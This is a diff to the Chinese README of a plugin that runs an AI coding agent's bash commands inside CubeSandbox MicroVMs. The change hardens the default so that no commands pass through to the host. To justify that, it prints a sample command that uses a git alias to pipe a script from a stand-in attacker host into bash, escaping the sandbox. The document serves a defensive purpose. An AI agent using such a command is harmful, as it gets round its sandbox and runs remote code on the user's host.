@@ -28,7 +28,7 @@ OpenCode（宿主）
   ├── read / write / edit ──────────────────► 宿主项目文件
   │
   └── bash ──► tool.execute.before ──► exec_backend.py ──► CubeAPI ──► MicroVM
-               (cubesandbox-bash.js)                       (:3000)     └─ 每 session 一个
+               (cubesandbox-bash.js)                       (:3000)     └─ 每次调用一个
 ```
 
 模型照常下发普通的 `bash` 调用。它不知道、也不需要知道这些命令跑在别处。
@@ -166,20 +166,35 @@ python3 exec_backend.py --session <session-id> --reset
 | `E2B_API_KEY` | `e2b_000000` | 本地部署下任意非空字符串即可 |
 | `SSL_CERT_FILE` | — | mkcert CA，因为 SDK 走 HTTPS |
 | `CUBE_OPENCODE_PYTHON` | `python3` | 运行后端的解释器，用 venv 时需设置 |
-| `CUBE_OPENCODE_PASSTHROUGH` | `git,gh,opencode` | 保留在宿主执行的命令 |
+| `CUBE_OPENCODE_PASSTHROUGH` | 空 | 保留在宿主执行的命令，默认不放行任何命令 |
 | `CUBE_OPENCODE_TIMEOUT` | `120` | 单条命令超时秒数 |
 | `CUBE_OPENCODE_STATE_DIR` | `~/.cache/cubesandbox-opencode` | session 状态存放位置 |
 
-### 为什么 `git` 留在宿主
+### 放行清单，以及为什么 `git` 默认不在其中
 
-沙箱有自己独立的文件系统。在里面执行 `git commit` 操作的是另一个仓库，
-而不是 OpenCode 通过 `read` / `write` / `edit` 正在编辑的那个 ——
-提交里不会包含你的改动。
+放行清单是「在宿主执行任意命令」的逃生舱，而不是一个小例外。
+匹配只看首个 token，所以放行 `git` 等于放行所有以 `git` 开头的命令 ——
+而 git 可以被用来执行任意 shell：
 
-设 `CUBE_OPENCODE_PASSTHROUGH=` 可以让所有命令都进沙箱，
-但那样 Agent 就访问不到你的 git 历史了。
+```bash
+git -c alias.x='!curl http://attacker/sh | bash' x
+```
 
-匹配只看首个 token。`git status` 会放行；
+这条命令会在宿主上执行，既不隔离也不留日志。模型下发的命令正是本插件要约束的
+不可信输入，因此默认清单是空的。
+
+这个默认值的代价是真实存在的，也正是该机制存在的原因：沙箱有自己独立的文件系统，
+在里面执行 `git commit` 操作的是另一个仓库，而不是 OpenCode 通过
+`read` / `write` / `edit` 正在编辑的那个，提交里不会包含你的改动。
+如果 Agent 确实需要宿主的 git，请显式开启：
+
+```bash
+export CUBE_OPENCODE_PASSTHROUGH=git,gh
+```
+
+清单里的任何命令都必须被当作拥有宿主权限的完全可信命令。
+
+开启后匹配仍然只看首个 token：`git status` 会放行，
 `foo && git push` 不会 —— 因为复合命令里可能包含任何东西。
 
 ## 测试
@@ -188,7 +203,7 @@ python3 exec_backend.py --session <session-id> --reset
 node tests/test_plugin.mjs
 ```
 
-21 项断言，覆盖命令改写、放行名单、幂等性、session id 处理与引号注入抵抗。
+24 项断言，覆盖命令改写、放行名单、幂等性、session id 处理与引号注入抵抗。
 **仅依赖 Node 标准库** —— 不需要 npm install、不需要联网、不需要 CubeSandbox 部署。
 
 注入相关的断言会按 POSIX shell 的语义解析改写后的命令，
@@ -258,9 +273,14 @@ generateResolvConf = false
    或使用 CubeSandbox 的 pause/resume；两者都超出了本示例应有的复杂度。
 2. **`read` / `write` / `edit` 未被沙箱化。** 见「安全边界」。
 3. **钩子入参结构不是稳定契约。** session id 的键名在不同 OpenCode 版本间
-   拼写有差异，因此代码会探测多种变体并提供兜底。猜错只会损失沙箱复用的粒度，
-   绝不会削弱隔离性。
-4. **交互式命令不可用。** 输出是被捕获的，所以任何需要 TTY 的程序
+   拼写有差异，因此代码会探测多种变体并提供兜底。若所有已知键名都取不到，
+   全部 session 会坍缩到同一个状态文件与锁上，cwd 与导出的环境变量会在并发
+   session 之间互相串扰。命令仍然在 MicroVM 中执行，因此不构成宿主逃逸，
+   但影响比「只损失复用粒度」更大。
+4. **调用 `exec` 的命令会丢失状态更新。** `exec` 会替换 shell 的进程映像，
+   连同负责输出状态块的 trap 一起丢弃。此时会保留上一次的 session 状态，
+   所以 cwd 与环境变量是过期的、而不是错误的。`exit` 已能正确处理，仅 `exec` 受影响。
+5. **交互式命令不可用。** 输出是被捕获的，所以任何需要 TTY 的程序
    （`vim`、`top`）都不会正常工作。
 
 ## 已验证环境
@@ -276,7 +296,7 @@ generateResolvConf = false
 | `/data/cubelet` | XFS，`reflink=1` |
 | 沙箱创建耗时 | 约 1.0 秒 |
 | 完整 run_code 周期 | 约 2.4 秒 |
-| 插件测试 | 21/21 通过 |
+| 插件测试 | 24/24 通过 |
 
 ## 文件说明
 
@@ -285,7 +305,7 @@ generateResolvConf = false
 | `plugin/cubesandbox-bash.js` | `tool.execute.before` 钩子实现 |
 | `plugin/install.sh` | 幂等的安装 / 卸载 / 状态查看 |
 | `exec_backend.py` | 在 MicroVM 中执行单条命令，并维护 session 状态 |
-| `tests/test_plugin.mjs` | 21 项离线断言 |
+| `tests/test_plugin.mjs` | 24 项离线断言 |
 | `.env.example` | 全部配置项及说明 |
 
 ## 参考
